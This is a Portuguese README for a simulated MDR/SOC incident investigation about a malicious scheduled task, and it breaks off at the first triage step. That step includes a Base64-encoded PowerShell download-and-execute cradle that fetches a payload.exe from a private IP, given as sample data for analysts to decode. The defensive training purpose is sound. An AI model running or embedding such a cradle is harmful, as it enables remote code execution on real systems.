# Projeto MDR: Simulação de Incidente com Scheduled Task Maliciosa

<div align="center">
  
![Badge - Status](https://img.shields.io/badge/Status-Concluído-success?style=for-the-badge)
![Badge - SIEM](https://img.shields.io/badge/SIEM-Microsoft%20Sentinel-blue?style=for-the-badge)
![Badge - MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-red?style=for-the-badge)
![Badge - Nível](https://img.shields.io/badge/Nível-Júnior%20MDR-orange?style=for-the-badge)
![Badge - PowerShell](https://img.shields.io/badge/PowerShell-7.4-blue?style=for-the-badge&logo=powershell)
![Badge - KQL](https://img.shields.io/badge/KQL-Consultas-purple?style=for-the-badge)

**Autor:** Lourrane  
**Data:** Fevereiro/2026  
**LinkedIn:**(www.linkedin.com/in/lourrane-xavier)  
**E-mail:**lourrannyvick@gmail.com 

</div>

## Sobre o Projeto

Este repositório contém uma **simulação completa de um incidente de segurança** em um ambiente corporativo, reproduzindo o fluxo de trabalho de um **Analista Júnior de MDR (Managed Detection and Response)**.

O cenário aborda a detecção de uma **tarefa agendada maliciosa** que executa PowerShell ofuscado para baixar um payload, exigindo habilidades de **triagem, correlação de logs, consultas SIEM e aplicação do framework MITRE ATT&CK**.

> **Objetivo:** Demonstrar na prática os conhecimentos exigidos em vagas de SOC/MDR, desde o recebimento do alerta até a classificação e encaminhamento para o time de resposta.

---

## Tecnologias e Conceitos Utilizados

| Categoria | Ferramentas / Frameworks |
|-----------|--------------------------|
| **SIEM** | Microsoft Sentinel (conceitos aplicáveis a Splunk, QRadar, Elastic) |
| **Linguagem de Query** | KQL (Kusto Query Language) – consultas avançadas |
| **Frameworks de Segurança** | MITRE ATT&CK, Cyber Kill Chain |
| **Análise de Logs** | Event ID 4698 (criação de tarefa), 4104 (PowerShell), 4624 (logon) |
| **Scripts** | PowerShell (decodificação Base64, simulação de alertas) |
| **Threat Intelligence** | IoCs, VirusTotal (simulado), correlação |

---

##  Estrutura do Repositório
📁 mdr-incident-simulation-scheduler/
├── 📁 docs/ # Documentação detalhada da investigação
│ └── investigacao-completa.md
├── 📁 logs/ # Logs simulados (JSON)
│ ├── security-events.json
│ ├── powershell-logs.json
│ └── scheduled-tasks.json
├── 📁 queries/ # Consultas KQL e Splunk
│ ├── kql-consultas.kql
│ └── splunk-consultas.spl
├── 📁 iocs/ # Indicadores de Comprometimento
│ ├── indicadores-comprometimento.csv
│ └── threat-intel.md
├── 📁 scripts/ # Ferramentas auxiliares
│ ├── decodificador-base64.ps1
│ └── simulador-alerta.ps1
├── 📁 images/ # Imagens e diagramas
│ └── timeline-incidente.png
├── 📄 README.md # Este arquivo
└── 📄 .gitignore


---

## Cenário do Incidente

Um alerta é disparado no SIEM (Microsoft Sentinel):

> **Título:** "New Scheduled Task Created via Malicious PowerShell"  
> **Severidade:** Média  
> **Host:** SRV-APP-01  
> **Conta:** Usuário `JDOE`  
> **Descrição:** Tarefa agendada "UpdaterService" criada contendo script PowerShell codificado (Base64).

O analista precisa realizar a **triagem** e decidir se é um falso positivo ou um incidente real.

---

##  Passo a Passo da Investigação

### 1. Triagem Inicial (Analista Júnior)

- **Recebimento do alerta**  
- **Decodificação da string Base64**  
  ```powershell
  .\scripts\decodificador-base64.ps1 -Base64String "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA==" -Analyze

  
